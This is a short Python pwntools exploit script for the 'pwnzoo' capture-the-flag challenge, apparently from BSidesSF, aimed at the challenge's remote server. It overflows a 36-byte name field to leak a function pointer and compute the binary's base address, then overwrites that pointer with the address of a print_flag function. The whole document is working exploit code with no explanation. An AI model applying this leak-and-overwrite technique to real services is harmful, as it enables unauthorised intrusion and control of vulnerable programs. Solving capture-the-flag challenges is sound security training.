#!/usr/bin/env python
from pwn import *

context.binary = elf = ELF('pwnzoo')
# p = process(elf.path)
# gdb.attach(p, 'init-gef')
p = remote('pwnzoo-7fb58ad8.challenges.bsidessf.net', 1234)

p.sendlineafter("Play as cat or dog? ", "dog")

p.sendlineafter("New name: ", "A" * 36)

def option(num):
    p.sendlineafter("Exit\n", str(num))

option(1)

p.recvuntil("A"*36)

leak = p.recvuntil("!\n", True).ljust(8, "\x00")

leak = u64(leak)

elf.address = leak - elf.symbols['speak_dog']

log.info("ELF: 0x{:x}".format(elf.address))

payload = "A" * 36 + p64(elf.symbols["print_flag"])

option(2)

p.sendlineafter("New name: ", payload)

option(1)

p.interactive()
